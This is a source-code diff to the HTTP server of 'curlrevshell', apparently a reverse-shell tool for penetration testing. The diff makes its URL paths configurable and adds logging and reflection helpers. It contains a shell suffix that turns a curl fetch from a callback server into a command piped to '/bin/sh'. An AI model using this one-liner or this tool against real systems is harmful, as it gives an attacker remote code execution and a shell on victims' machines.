@@ -6,7 +6,7 @@ package hsrv
  * HTTP server
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240925
+ * Last Modified 20241210
  */
 
 import (
@@ -20,12 +20,14 @@ import (
 	"net/http"
 	"net/netip"
 	"os"
+	"reflect"
 	"slices"
 	"strconv"
 	"strings"
 	"text/template"
 
 	"github.com/magisterquis/curlrevshell/internal/iobroker"
+	"github.com/magisterquis/curlrevshell/lib/crstemplate"
 	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 	"github.com/magisterquis/curlrevshell/lib/sstls"
@@ -42,13 +44,14 @@ const (
 
 	// ShellSuffix is added to CurlFormat when telling the user haw to get
 	// a shell.
-	ShellSuffix = "/c | /bin/sh"
+	ShellSuffix = "/%s | /bin/sh"
 )
 
 // Log messages and keys.
 const (
 	LMListening               = "Listener started"
 	LMOneShellClosingListener = "Got one shell, closing listener"
+	LMURLPaths                = "Non-Default URL Paths"
 
 	LKError      = "error"
 	LKListenAddr = "address"
@@ -72,6 +75,7 @@ type Server struct {
 	/* Template generation. */
 	tmplf   string             /* Template file. */
 	defTmpl *template.Template /* Default template, for testing. */
+	ups     crstemplate.URLPaths
 
 	/* Things for printing help. */
 	cbAddrs   []string
@@ -97,6 +101,7 @@ func New(
 	cbAddrs []string, /* Callback addresses, for one-liners. */
 	printIPv6 bool,
 	oneShell bool, /* Shut down listener after first shell. */
+	ups crstemplate.URLPaths,
 ) (*Server, error) {
 	var l sstls.Listener
 
@@ -113,6 +118,11 @@ func New(
 	}
 	sl.Info(LMListening, LKListenAddr, l.Addr().String())
 
+	/* Make sure our URL paths are set and don't start or end with /'s. */
+	if uf := cleanURLPaths(&ups); "" != uf {
+		return nil, fmt.Errorf("URL path unset: %s", uf)
+	}
+
 	/* Server to return. */
 	s := &Server{
 		sl:        sl,
@@ -124,6 +134,7 @@ func New(
 		ps:        pinkSender{och},
 		tmplf:     tmplf,
 		defTmpl:   parsedDefaultTemplate,
+		ups:       ups,
 		cbAddrs:   cbAddrs,
 		printIPv6: printIPv6,
 		oneShell:  oneShell,
@@ -151,10 +162,27 @@ func New(
 			CurlFormat+ShellSuffix+"\n",
 			s.l.Fingerprint,
 			la,
+			s.ups.Script,
 		)
 	}
 	sb.WriteRune('\n')
 	s.cbHelp = sb.String()
+
+	/* Log the paths we're using if they're not the defaults. */
+	defUPS := crstemplate.URLPaths{
+		In:     crstemplate.DefaultURLPathIn,
+		InOut:  crstemplate.DefaultURLPathInOut,
+		Out:    crstemplate.DefaultURLPathOut,
+		Script: crstemplate.DefaultURLPathScript,
+	}
+	if s.ups != defUPS {
+		sl.LogAttrs(
+			context.Background(),
+			slog.LevelInfo,
+			LMURLPaths,
+			slogAttrsFromURLPaths(s.ups)...,
+		)
+	}
 
 	return s, nil
 }
@@ -410,4 +438,37 @@ func sortAddresses(as []string) []string {
 		return 0
 	})
 	return slices.Compact(as)
+}
+
+// slogAttrsFromURLPaths turns p.URLPaths into Attrs suitable for sending to
+// one of slog.Logger's methods.
+func slogAttrsFromURLPaths(p crstemplate.URLPaths) []slog.Attr {
+	/* Introspect the URLPaths in p. */
+	v := reflect.ValueOf(p)
+	t := v.Type()
+	/* We'll return as many attrs as there are paths. */
+	ret := make([]slog.Attr, t.NumField())
+	/* Grab each path and turn into an attr. */
+	for i := range ret {
+		ret[i] = slog.String(t.Field(i).Name, v.Field(i).String())
+	}
+	/* Sort, which makes testing that much easier. */
+	slices.SortFunc(ret, func(a, b slog.Attr) int {
+		return strings.Compare(a.Key, b.Key)
+	})
+	return ret
+}
+
+// cleanURLPaths removes leading and trailing slashes from the fields in p.
+// The first empty field in p is returned, if any.  If all goes well, the empty
+// string is returned.
+func cleanURLPaths(p *crstemplate.URLPaths) string {
+	v := reflect.ValueOf(p).Elem()
+	for i := range v.NumField() {
+		v.Field(i).SetString(strings.Trim(v.Field(i).String(), "/"))
+		if v.Field(i).IsZero() {
+			return v.Type().Field(i).Name
+		}
+	}
+	return ""
 }
